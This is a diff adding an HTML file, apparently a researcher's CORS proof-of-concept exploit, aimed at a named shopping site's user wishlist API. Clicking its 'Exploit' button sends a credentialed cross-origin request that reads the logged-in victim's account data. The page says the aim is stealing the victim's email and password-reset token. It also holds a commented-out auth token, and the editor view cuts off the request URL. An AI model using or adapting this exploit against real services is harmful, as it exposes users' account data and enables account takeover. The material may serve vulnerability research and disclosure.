@@ -1,0 +1,30 @@
+  GNU nano 6.3                                          temp.html                                                   
+<!DOCTYPE html>
+<html>
+   <head>
+      <script>
+ function cors() {
+                var xhttp = new XMLHttpRequest();
+                        xhttp.onreadystatechange = function() {
+                                if (this.readyState == 4 && this.status == 200) {
+                                        document.getElementById("mainDiv").innerHTML = alert(this.responseText);
+                }
+         };
+         xhttp.open("GET", "https://api.aboutyou.com/user/me/wishlist/bapi?with=items.product.attributes:key(brand%>
+//         xhttp.setRequestHeader("X-Auth-Token",'571722a1-3aa9-41d9-8d17-d97e4d9ad24e');
+xhttp.withCredentials = true;
+         xhttp.send();
+         }
+</script>
+</head>
+   <body>
+      <center>
+      <h2>CORS PoC Exploit </h2>
+      <h3>created by <a href="https://twitter.com/marcos_iaf">@marcos_iaf</a></h3>
+      <h3>Steal Victim's Email and Pass reset token...lol</h3>
+      <div id="demo">
+         <button type="button" onclick="cors()">Exploit</button>
+<h1> RatSec <3 Much Love</h1>
+ </div>
+   </body>
+</html>
